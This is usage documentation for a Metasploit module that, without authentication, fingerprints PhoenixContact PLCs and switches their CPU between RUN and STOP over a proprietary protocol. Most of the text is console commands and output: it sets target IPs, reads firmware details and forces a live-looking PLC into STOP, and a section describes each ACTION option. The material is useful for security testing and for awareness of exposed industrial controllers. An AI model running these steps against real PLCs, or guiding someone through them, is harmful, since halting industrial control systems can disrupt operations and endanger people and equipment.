PhoenixContact Programmable Logic Controllers are built are using a variant of
ProConOS. The communicate using a proprietary protocol over ports TCP/1962 and
TCP/41100 or TCP/20547.  This protocol allows a user to remotely determine the
PLC type, firmware and build number on port TCP/1962.  A user can also
determine the CPU State (Running or Stopped) and start or stop the CPU.

This functionality is confirmed for the PLC series ILC 15x and 17x on TCP port
20547, and for the ILC 39x series on TCP port 41100. Other series may or
may not work, but there is a good chance that they will

## Vulnerable Application

This is a hardware zero-day vulnerability that CANNOT be patched. Possible
mitigations include: pulling the plug (literally), using network isolation
(Firewall, Router, IDS, IPS, network segmentation, etc...) or not allowing bad
people on your network.

Most, if not all, PLC's (computers that control engines, robots, conveyor
belts, sensors, camera's, doorlocks, CRACs ...) have vulnerabilities where,
using their own tools, remote configuration and programming can be done
*WITHOUT* authentication.  Investigators and underground hackers are just now
creating simple tools to convert the, often proprietary, protocols into simple
scripts.  The operating word here is proprietary. Right now, the only thing
stopping very bad stuff from happening.  PhoenixContact uses an (unnamed?)
low-level protocol for connection, information exchange and configuration of
its PLC devices.  This script utilizes that protocol for finding information
and switching the PLC mode from STOP to RUN and vice-versa.

## Verification Steps

The following demonstrates a basic scenario, we "found" two devices with an open port TCP/1962:

```
msf > search phoenix
msf > use auxiliary/admin/scada/phoenix_command
msf auxiliary(phoenix_command) > set RHOST 10.66.56.12
RHOST => 10.66.56.12
msf auxiliary(phoenix_command) > run

[*] 10.66.56.12:0 - PLC Type = ILC 150 GSM/GPRS
[*] 10.66.56.12:0 - Firmware = 3.71
[*] 10.66.56.12:0 - Build    = 07/13/11 12:00:00
[*] 10.66.56.12:0 - ------------------------------------
[*] 10.66.56.12:0 - --> Detected 15x/17x series, getting current CPU state:
[*] 10.66.56.12:0 - CPU Mode = RUN
[*] 10.66.56.12:0 - ------------------------------------
[*] 10.66.56.12:0 - --> No action specified (NOOP), stopping here
[*] Auxiliary module execution completed

msf auxiliary(phoenix_command) > set RHOST 10.66.56.72
RHOST => 10.66.56.72
msf auxiliary(phoenix_command) > set ACTION REV
ACTION => REV
msf auxiliary(phoenix_command) > run
[*] 10.66.56.72:0 - PLC Type = ILC 390 PN 2TX-IB
[*] 10.66.56.72:0 - Firmware = 3.95
[*] 10.66.56.72:0 - Build    = 02/14/11 14:04:47
[*] 10.66.56.72:0 - ------------------------------------
[*] 10.66.56.72:0 - --> Detected 39x series, getting current CPU state:
[*] 10.66.56.72:0 - CPU Mode = RUN
[*] 10.66.56.72:0 - ------------------------------------
[*] 10.66.56.72:0 - --> Sending STOP now
[*] 10.66.56.72:0 - CPU Mode = STOP
[*] Auxiliary module execution completed
```

## Options
```
msf auxiliary(phoenix_command) > show options

Module options (auxiliary/admin/scada/phoenix_command):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   ACTION     NOOP             yes       PLC CPU action, REV means reverse state (Accepted: STOP, START, REV, NOOP)
   RHOST                       yes       The target address
   RINFOPORT  1962             yes       Set info port
   RPORT                       no        Set action port, will try autodetect when not set
```

By default, the module only reads out the PLC Type, Firmware version, Build
date and current CPU mode (RUNing or STOPed)

The first three pieces of data (Type, Firmware & Build) are always found on
port TCP/1962 (there is no way of changing that port on the PLC, so also no
reason to change the 'RINFOPORT' option)

The CPU mode uses a TCP port depending on the PLC Type, the module will
automatically detect the type and port to use, but can be overridden with the
'RPORT' option, however no real reason to configure it. If you accidentally set RPORT, you can unset it with the ```unset RPORT``` command.

**The ACTION option**

Action has four possible values:

By default, the module will do nothing to the PLC, therefore No Operation or 'NOOP':

```
msf auxiliary(phoenix_command) > set ACTION NOOP
```

The PLC can be forced to go into STOP mode, meaning it stops all execution and all outputs are set to low:

```
msf auxiliary(phoenix_command) > set ACTION STOP
```

The PLC can be forced to go into RUN mode, where it keeps running it was or it will start executing its current boot programming:

```
msf auxiliary(phoenix_command) > set ACTION START
```

The module can also just read out the CPU mode and then reverse whatever it finds, RUN becomes STOP, STOP becomes RUN:

```
msf auxiliary(phoenix_command) > set ACTION REV
```
